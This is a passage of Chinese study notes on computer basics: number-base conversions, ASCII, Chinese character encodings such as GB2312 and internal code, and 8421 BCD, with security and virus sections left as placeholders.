进行转换：\n\n由上得出，100D=1100100B。\n对小数部分 0.125 进行转换：\n\n由上得出，0.125D=0.001B\n最终得出，100.125D=1100100.001B。\n二进制、八进制、十六进制数的相互转换\n由于二进制、八进制、十六进制之间存在特殊关系：23=81，24=161，即 1 位八进制数相当于 3 位二进制数，1 位十六进制数相当于 4 位二进制数，因此转换方法就比较容易。\n\n八进制和十六进制不能直接互相转换\n\n二进制数与八进制数的相互转换\n二进制数转换成八进制数的方法是：将二进制数从小数点开始，对二进制整数部分向左每 3 位分成一组，不足 3 位的向高位补 0 凑成 3 位；对二进制小数部分向右每 3 位分成一组，不足 3 位的向低位补 0 凑成 3 位。每一组 3 位二进制数，分别转换成八进制数码中的一个数字，全部连接起来即可。\n例如：11111101.1011B\n\n\n\n二进制三位分组\n011\n111\n101.\n101\n100\n\n\n\n\n转换为八进制数\n3\n7\n5.\n5\n4\n\n\n\n因此 11111101.1011B=375.54O\n将八进制数转换成二进制数\n将每一位八进制数转换成相应的 3 位二进制数，依次连接起来即可。\n例如：375.54O\n\n\n\n八进制数\n3\n7\n5.\n5\n4\n\n\n\n\n转换为二进制数\n011\n111\n101.\n101\n100\n\n\n\n因此 375.54O=11111101.1011B\n二进制数与十六进制数的相互转换\n二进制数与十六进制数的转换，与二进制数和八进制数的转换类似，只不过是每 4 位二进制数与 1 位十六进制数的相互转换。\n例如：11111101.1011B\n\n\n\n二进制四位分组\n1111\n1101.\n1011\n\n\n\n\n转换为十六进制数\nF\nD.\nB\n\n\n\n因此 11111101.1011B=FD.BH\n将十六进制数转换成二进制数\n将每一位十六进制数转换成相应的 4 位二进制数，然后依次连接起来即可。\n例如：11111101.1011B\n\n\n\n十六进制数\nF\nD.\nB\n\n\n\n\n转换为二进制数\n1111\n1101.\n1011\n\n\n\n因此 FD.BH=11111101.1011B\n字符的编码表示\n西文字符编码\n西文字符编码最常用的是 ASCII（美国信息交换标准代码）字符编码，该编码标准已经被国际标准化组织（ISO）指定为国际标准，是国际上使用最广泛的一种字符编码。标准的 ASCII 码采用 7 位二进制编码，它可以表示 27 即 128 个字符。\n计算机的内部存储与操作常以字节为单位，即 8 个二进制为单位，因此一个 ASCII 码在计算机内实际是用一个字节（8 位）表示，正常情况下，最高位为 0。在需要奇偶校验时，这一位可用于存放奇偶效验的值，此时称这一位为效验位。\nASCII 编码，编码范围从 0000000B-1111111B。\n编码值 0~31（0000000-0011111）不对应任何可印刷字符，通常为控制符，用于计算机通信中的通信控制或对设备的功能控制；编码值 32（0100000）是空格字符，编码值 127（1111111）是删除控制 DEL 码；其余 94 个字符为可印刷字符。在这些字符中，从 0~9、从 A~Z、从 a~z 都是顺序排列，逐次增加 1 的，有利于计算得出 ASCII 码值，并且小写字符比对应大写字符的码值大 32，这有利于大、小写字母之间的编码转换。\n由上 ASCII 码值表述可知，控制符&lt;空格字符&lt;数字字符&lt;大写字母&lt;小写字母。\n汉字字符编码\n计算机中汉字的表示也是用二进制编码，根据应用目的的不同，汉字编码分为输入码（外码）、国标码、机内码和字形码。汉字编码的转换过程如下图：\n\n汉字输入码\n汉字输入码又称为汉字外码，是一种用计算机标准键盘的不同排列组合来对汉字的输入进行的编码。目前汉字输入编码的研究和发展迅速，已有上百种汉字输入编码法。衡量一个输入编码法的好坏应有以下要求：编码短，可以减少击键的次数；重码少，可以实现盲打；好学好记，便于学习和掌握。但现在还没有一种全部符合上述要求的汉字输入编码方法。目前常用的汉字编码主要分成为以下三类。\n\n音码\n主要是以汉语拼音为基础的编码方案，如全拼、双拼、简拼和智能 ABC 等。音码的重码率高，单字输入速度慢，但容易掌握。\n型码\n型码主要是根据汉字的特点，按汉字固有的形状，把汉字先拆分成部首，然后进行组合，代表有五笔字形法、郑码输入法等。型码重码较少，单字输入速度快，但学习和掌握较难。\n数字编码\n常用的是国标区位码，用数字串输入一个汉字。区位码是将国家标准局公布的 6763 个两级汉字分为 94 个区，每个区分 94 位，实际上把汉字集排列成二维数组的形式，行为区，列为位，每个汉字在数组中的下标就是区位码。区码和位码各用两位十进制数表示，因此输入一个汉字需要按键 4 次。例如“中”字位于第 54 区 48 位，区位码为 5448.数字编码输入的优点是无重码，与内部编码的转换比较方便，缺点是代码难以记忆。\n为了提高输入速度，输入方法现已走向了智能化，智能化方向是基于模式识别的语音识别输入，手写输入或扫描输入。\n\n汉字国标码\n汉字国标码是我国 1980 年发布的《信息交换用汉字编码字符集—基本集》（代号为 GB2312-80），是中文信息处理的国家标准，也称汉字交换码，简称 GB 码。国标码对汉字进行编码时，每个汉字的编码占两个字节。国标码使用了每个字节的低位 7 位进行编码，每个字节最高位仍为“0”，最大可容纳 128×128=16384 个汉字集字符。根据统计，把最常用的 6763 个汉字分成两级：一级汉字有 3755 个，按拼音字母排序排列；二级汉字有 3008 个，按偏旁部首排列排序。\n汉字机内码\n汉字在计算机内部使用的编码就是汉字机内码，又称汉字内码。每个汉字内码占用两个字节，并且每个字节的最高位为 1，这是为了避免汉字的内码与英文字符编码（ASCII 码）发生冲突，容易区分汉字编码与英文字符编码，同时为了用尽可能少的存储空间来表示尽可能对的汉字而做出的约定。\n汉字机内码的计算公式：\n汉字机内码 = 汉字国标码+8080H = 区位码+A0A0H\n汉字字形码\n汉字字形码也叫汉字字模或汉字输出码，用于汉字在显示屏或打印机输出。汉字字形码通常有两种表示方法：点阵式和矢量式。\n点阵式表示字形时，将汉字图像一样置于网状方格上，每格是存储器中的一个位（bit）。例如，16×16 点阵是在纵向 16 点、横向 16 点的网状方格上写一个汉字，有笔划的格对应 1，无笔划的格对应 0。点阵式包括 16×16 点阵、24×24 点阵、32×32 点阵、48×48 点阵等，点阵越大，描述的字形越细致美观，质量越高，所占存储空间也越大。在计算机中，8 个二进制位组成一个字节，它是度量空间的基本单位。一个 16×16 点阵的字形码需要 16×16/8=32 字节的存储空间，即\n点阵字形码所占字节数=点阵行数 × 点阵列数/8\n矢量式是描述汉字字形的轮廓特征，当要输出汉字时，字形和大小与计算机的分辨率无关，可以产生高质量的汉字输出，并节省存储空间。用矢量式记录的字体可以任意放缩甚至变形，而不用担心会出现锯齿状的边缘。\n汉字字形数字化后，以二进制文件的形式存储在存储器中，所有汉字的输出码就构成了汉字字形库，简称汉字库。\nBCD 码\n计算机内部采用二进制表示和处理数据。因此，在计算机中输入和输出数据时，就要进行从十进制到二进制和从二进制到十进制的转换处理。人们通常采用把十进制数的每一位分别写成二进制数形式的编码，称为 BCD 码。\nBCD 编码的方法很多，通常采用的是 8421 编码，其方法是用四位二进制数表示一位十进制数，自左至右每一位对应的权是 8、4、2、1.四位二进制数有 0000~1111 十六个状态，只取 0000~1001 十种状态，而 1010~1111 六个状态没有意义。\n\n\n\n十进制数\n8421\n\n\n\n\n0\n0000\n\n\n1\n0001\n\n\n2\n0010\n\n\n3\n0011\n\n\n4\n0100\n\n\n5\n0101\n\n\n6\n0110\n\n\n7\n0111\n\n\n8\n1000\n\n\n9\n1001\n\n\n10\n0001 0000\n\n\n\n计算机信息安全\n等待补充。\n计算机病毒\n等待补充。\n计算机多媒体技术基础\n等待补充。\n","tags":["计算机","基础"]}]